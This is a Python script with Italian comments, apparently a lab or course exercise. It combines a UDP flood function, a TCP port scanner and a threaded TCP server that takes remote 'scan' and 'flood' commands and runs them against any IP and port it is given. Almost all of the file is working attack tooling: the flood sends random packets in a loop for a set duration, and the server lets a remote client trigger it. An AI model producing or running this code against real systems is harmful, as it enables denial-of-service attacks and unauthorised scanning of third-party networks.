import socket as so
import random
import time
import threading

# Funzione per eseguire l'UDP flood
def udp_flood(target_ip, target_port, duration):
    client = so.socket(so.AF_INET, so.SOCK_DGRAM)
    bytes_to_send = random.randbytes(1024)  # Genera un pacchetto di 1024 byte di dati casuali
    timeout = time.time() + duration

    print(f"Iniziando l'UDP flood su {target_ip}:{target_port} per {duration} secondi")
    while True:
        if time.time() > timeout:
            break
        try:
            client.sendto(bytes_to_send, (target_ip, target_port))
        except Exception as e:
            print(f"Errore durante l'invio del pacchetto: {e}")
            break
    print("UDP flood terminato.")

# Funzione per eseguire la scansione delle porte
def port_scan(target, portrange):
    lowport = int(portrange.split("-")[0])
    highport = int(portrange.split("-")[1])

    print(f"Verranno scansionate le porte da {lowport} a {highport}")

    closedPort = []
    filteredPort = []
    openPorts = []
    for port in range(lowport, highport + 1):
        s = so.socket(so.AF_INET, so.SOCK_STREAM)
        status = s.connect_ex((target, port))
        if status == 0:
            print(f"*** Porta {port} - Aperta ***")
            openPorts.append(port)
        else:
            if status == 111:
                closedPort.append(port)
            else:
                filteredPort.append(port)
        s.close()

    print("Porte filtrate:", filteredPort)
    yesno = input("\nVuoi che ti mostri le porte chiuse? (S/N): ")
    if yesno.lower().startswith("s"):
        print(f"\nTrovate chiuse {closedPort}")

    return openPorts

# Funzione per gestire la connessione TCP
def handle_client(connection, address):
    print(f"Client in ascolto all'indirizzo {address}")
    connection.sendall(b"Ciao!\nFaccio echo:\n")
    while True:
        connection.sendall(b"$ ")
        data = connection.recv(1024)
        if not data:
            break
        connection.sendall(b"# ")
        command = data.decode('utf-8').replace("\n", "")
        if command == "ciao":
            connection.sendall(b"Non abbiamo gia' stabilito il saluto?\n")
        elif command == "ls":
            connection.sendall(b"Non e' possibile avere informazioni!\n")
        elif command.startswith("scan"):
            # Parsing e gestione del comando di scansione
            try:
                _, target_ip, portrange = command.split()
                open_ports = port_scan(target_ip, portrange)
                if open_ports:
                    connection.sendall(f"Porte aperte: {open_ports}\n".encode('utf-8'))
                else:
                    connection.sendall(b"Nessuna porta aperta trovata.\n")
            except Exception as e:
                connection.sendall(f"Errore durante la scansione delle porte: {e}\n".encode('utf-8'))
        elif command.startswith("flood"):
            # Parsing e gestione del comando di UDP flood
            try:
                _, target_ip, target_port, duration = command.split()
                target_port = int(target_port)
                duration = int(duration)
                udp_flood(target_ip, target_port, duration)
                connection.sendall(b"UDP flood completato.\n")
            except Exception as e:
                connection.sendall(f"Errore durante l'UDP flood: {e}\n".encode('utf-8'))
        else:
            connection.sendall(data)
        print(data.decode('utf-8'))
    connection.close()

# Avvio del server TCP
SRV_ADDR = "192.168.50.101"
SRV_PORT = 40000

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)

print(f"Il server e' avviato su {SRV_ADDR}:{SRV_PORT}")
while True:
    connection, address = s.accept()
    threading.Thread(target=handle_client, args=(connection, address)).start()
